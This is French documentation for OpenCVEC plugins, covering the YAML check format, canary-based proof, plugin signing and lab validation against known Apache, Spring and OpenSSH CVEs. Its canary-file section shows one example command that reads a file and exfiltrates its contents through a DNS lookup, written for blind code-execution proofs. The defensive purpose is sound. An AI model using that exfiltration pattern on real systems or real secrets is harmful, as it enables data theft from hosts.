# Écrire, signer et publier un plugin

Un plugin ajoute un check à OpenCVEC sans mettre à jour l'application. Exemple : une CVE vient de sortir, l'équipe OpenCVEC publie `nouvelle-cve.yaml` et sa signature sur GitHub, et chaque entreprise l'installe depuis **Plugins › Catalogue officiel**.

## Principes imposés par le moteur

- **Le plugin ne choisit pas sa cible.** Une étape HTTP donne un *chemin* (`/x/y`), une étape TCP un *port*. L'hôte est toujours l'asset du check, dont la propriété a été prouvée, et la garde réseau vérifie l'IP contactée.
- **La preuve passe par un canari.** Deux familles de preuve existent :
  - en mode `canary`, la cible résout `{{canary.dns.pN}}` ou appelle `{{canary.url.pN}}`, ou bien le contenu du canari fichier revient dans une réponse ou par exfiltration DNS ;
  - en mode `fingerprint`, aucune charge n'est envoyée : seule l'empreinte (version, bannière) est comparée aux versions corrigées.
- **Rien n'est conservé des réponses** : seules les valeurs extraites et la présence du jeton sont enregistrées.
- **Champs inconnus refusés**, variables limitées à la liste ci-dessous, et taille maximale de 256 Kio.

Le contenu du plugin est affiché en entier à l'administrateur avant installation.

## Canari fichier

Pour les failles qui donnent accès au système de fichiers ou à l'exécution de code, l'entreprise dépose sur l'asset un **canari fichier** depuis la fiche de l'asset. C'est un fichier dont le contenu est un jeton unique, inconnu de l'extérieur. Le plugin exploite la faille *uniquement* pour lire ce fichier :

- `proofs.file_in_response: true` : le jeton apparaît dans une réponse (lecture de fichier, exécution avec sortie visible) ;
- `proofs.file_callback: true` : la cible exfiltre le jeton par DNS, par exemple `getent hosts $(cat {{canary.file.path}}).<zone>`, pour les exécutions de code « aveugles ».

Le même fichier sert de **jeton piège** : s'il est lu en dehors d'un check, OpenCVEC lève une alerte de compromission.

## Format

```yaml
id: exemple-cve-2099-0001        # minuscules, chiffres, tirets (3 à 63)
name: ExempleChecker
version: 1.0.0                   # x.y.z ; incrémenter à chaque publication
author: Votre équipe
cves: [CVE-2099-0001]
product: Produit X 1.0 à 1.4
description: Ce que vérifie le plugin et dans quelles conditions la faille est exploitable.
mode: canary                     # canary ou fingerprint
proof: Requête DNS sur le canari
sent: Description honnête de ce qui est envoyé à la cible (affichée avant installation et dans les rapports).
remediation: [Mettre à jour en 1.5, …]
references: [https://…]
tags: [produitx]                 # sert aux suggestions selon les tags des assets
default_port: 8443               # port des étapes TCP (sinon port de l'URL cible)

steps:
  - id: injection
    http:
      method: POST               # GET par défaut
      path: "/api/import?url={{canary.url.p1}}"
      headers:
        X-Custom: "{{canary.dns.p2}}"   # casse conservée telle qu'écrite
      body: "…"
  - id: banniere
    tcp:
      port: 22                   # facultatif
      tls: false
      send: "HELLO\r\n"          # ou send_hex: "16 03 01 …"
      read_bytes: 256
      timeout: 5s

proofs:                          # mode canary uniquement
  callback: true
  file_in_response: false
  file_callback: false
```

En mode `fingerprint`, les extractions alimentent une règle de version ou des matchers :

```yaml
extract:
  - name: version
    step: banniere
    part: body                   # body, status, all, header:<Nom>
    regex: 'ProduitX/([0-9]+)\.([0-9]+)\.([0-9]+)'
    format: "{1}.{2}.{3}"
version_rule:
  var: version
  vulnerable:
    - range: ">=1.0, <1.5"
      message: "ProduitX {{version}} : vulnérable d'après sa version."
  patched_message: "ProduitX {{version}} : version corrigée."
  missing_message: "Version non exposée."
matchers:                        # évalués avant version_rule ; premier qui correspond
  - step: banniere
    status: [200]
    contains: ["produitx-admin"]
    verdict: exposed             # probable, exposed, patched, inconclusive
    message: "Console d'administration exposée."
```

### Variables

| Variable | Valeur |
|---|---|
| `{{canary.dns.p1}}` … `{{canary.dns.p99}}` | nom DNS unique du point d'injection |
| `{{canary.url.pN}}` | `http://<nom du point>/` (récepteur HTTP) |
| `{{canary.file.path}}` | chemin du canari fichier déposé sur l'asset |
| `{{target.host}}`, `{{target.port}}`, `{{target.base}}`, `{{target.path}}`, `{{target.url}}` | URL cible du check |
| `{{random}}` | 12 caractères hexadécimaux aléatoires |

Les messages des règles et matchers peuvent citer les valeurs extraites (`{{version}}`).

## Tester, signer, publier

```sh
opencvec plugin lint mon-plugin.yaml                  # format et règles de sûreté
opencvec plugin keygen ~/.opencvec/keys/mon-equipe     # une fois : clé privée à garder secrète
opencvec plugin sign ~/.opencvec/keys/mon-equipe.key mon-plugin.yaml
opencvec plugin verify ~/.opencvec/keys/mon-equipe.pub mon-plugin.yaml
opencvec plugin index plugins/                         # met à jour index.json du dépôt
```

Pour tester sans signer, un administrateur peut activer temporairement le **mode développeur** (Administration › Récepteur canari et limites). L'activation et chaque installation non signée sont journalisées.

Pour publier un plugin interne, ajoutez la clé publique de votre équipe dans **Plugins › Éditeurs de confiance**, puis installez le plugin par URL ou par fichier. Le catalogue officiel est lu à l'adresse `OPENCVEC_PLUGIN_REGISTRY`, qui doit contenir `index.json`, les `.yaml` et les `.sig`.

## Validation en labo

Chaque plugin officiel doit donner le verdict attendu sur une cible vulnérable **et** sur une cible corrigée. Ajoutez les cibles dans `lab/compose.yaml` et les cas dans `scripts/lab-plugins-e2e.sh`. Les plugins actuels ont été validés ainsi le 14/11/2026.

| Plugin | Vulnérable | Corrigé |
|---|---|---|
| ApacheTraversal (CVE-2021-41773) | httpd 2.4.49 avec `Require all granted` sur `/` : prouvé | httpd 2.4.51 : non concluant |
| SpringFunction (CVE-2022-22963) | Spring Cloud Function 3.2.2 : prouvé | aucune image corrigée testée |
| RegreSSHion (CVE-2024-6387) | OpenSSH 9.6 : probable | OpenSSH 9.9 : version corrigée |

Le labo a corrigé trois erreurs que les tests unitaires ne voyaient pas :
- Spring lit un en-tête en respectant la casse, alors que Go la canonicalise ;
- Alpine affiche « OpenSSH_9.6 » sans suffixe « p1 » ;
- Apache 2.4.49 n'est pas exploitable dans sa configuration d'origine.
